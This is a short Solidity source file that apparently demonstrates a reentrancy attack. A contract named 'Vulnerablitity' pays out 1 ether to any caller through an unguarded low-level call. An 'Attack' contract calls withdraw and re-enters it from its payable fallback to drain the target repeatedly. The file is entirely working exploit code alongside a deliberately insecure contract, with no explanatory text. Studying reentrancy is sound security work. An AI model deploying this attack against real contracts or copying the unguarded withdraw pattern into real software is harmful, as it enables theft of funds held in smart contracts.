pragma solidity 0.4.23;

contract Vulnerablitity {
    function getBalance(address _account) public view returns (uint256) {
        return address(_account).balance;
    }
    
    function() external payable {}
    
    function withdraw() public returns (bool) {
        return msg.sender.call.value(1e18)();   
    }
}

contract Attack {
    Vulnerablitity v;
    constructor(address _contractAddr) public {
        v = Vulnerablitity(_contractAddr);
    }
    
    function attackContract() public {
        v.withdraw();
    }
    
    function() external payable {
        v.withdraw();
    }
}